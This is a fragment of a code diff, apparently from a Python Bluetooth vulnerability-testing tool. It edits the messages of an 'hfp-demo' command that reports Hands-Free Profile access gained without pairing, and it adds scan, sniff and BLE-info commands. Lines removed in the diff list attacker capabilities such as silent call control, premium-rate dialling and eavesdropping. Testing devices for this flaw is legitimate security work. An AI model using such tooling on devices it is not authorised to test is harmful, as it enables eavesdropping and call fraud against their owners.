+        logging.info("VULNERABLE: Full HFP access achieved without pairing!")
+        if use_ag_role:
+            logging.info("  - Sent real HFP commands to headset")
+            logging.info("  - Headset accepted us as Audio Gateway")
+        else:
+            logging.info("  - Full control over phone's HFP interface")
     else:
-        logging.info("Connected as Hands-Free to phone. An attacker can:")
-        logging.info("  1. Answer/reject calls without the user knowing")
-        logging.info("  2. Initiate calls to premium rate numbers")
-        logging.info("  3. Activate voice assistants (Siri/Google)")
-        logging.info("  4. Access call history and phone status")
-        logging.info("  5. Eavesdrop on calls via audio routing")
+        logging.info("PARTIAL: RFCOMM connected but SLC did not complete.")
+        logging.info("  - This may indicate the device is PATCHED")
+        logging.info("  - Or requires additional protocol handling")
     logging.info("")
-    logging.info("This works because the device accepts Bluetooth connections")
-    logging.info("without requiring pairing/authentication.")
+    logging.info("Connection was made WITHOUT pairing/authentication.")
     logging.info("")
 
     # Cleanup
@@ -2400,6 +4061,15 @@ async def main():
         return
     if args.command == "hfp-demo":
         await command_hfp_demo(args)
+        return
+    if args.command == "scan":
+        await command_scan(args)
+        return
+    if args.command == "sniff":
+        await command_sniff(args)
+        return
+    if args.command == "ble-info":
+        await command_ble_info(args)
         return
 
     # Initialize the transport class based on the given technology and target UUIDs
